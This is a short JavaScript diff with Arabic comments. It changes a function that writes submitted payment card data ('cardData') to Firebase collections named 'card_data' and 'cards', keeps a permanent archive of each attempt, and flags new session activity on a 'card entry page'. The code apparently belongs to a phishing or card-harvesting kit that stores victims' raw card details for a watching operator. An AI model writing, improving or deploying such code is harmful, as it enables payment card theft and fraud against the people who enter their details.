@@ -258,11 +258,19 @@
       timestamp: timestampStr
     };
 
-    rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData);
-    rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة التحقق' });
-    db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData);
-    // أرشيف دائم في مجموعة cards
-    db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() });
+    // أرشيف دائم في مجموعة cards + سجل المحاولات اللحظي
+    const writes = [
+      rtd.ref('sessions/' + sessionId + '/attempts/' + attemptId).set(cardData),
+      rtd.ref('sessions/' + sessionId).update({ hasNewActivity: true, page: 'صفحة إدخال البطاقة' }),
+      db.collection("card_data").doc(sessionId).collection("attempts").doc(attemptId).set(cardData),
+      db.collection("cards").doc(attemptId).set({ ...cardData, sessionId: sessionId, createdAt: firebase.firestore.FieldValue.serverTimestamp() })
+    ];
+    try {
+      return Promise.all(writes).then(function () { return cardData; });
+    } catch (err) {
+      console.error('pushFirebaseCard error:', err);
+      return Promise.reject(err);
+    }
   };
 
   // ═══════════════════════════════════════════════════════════
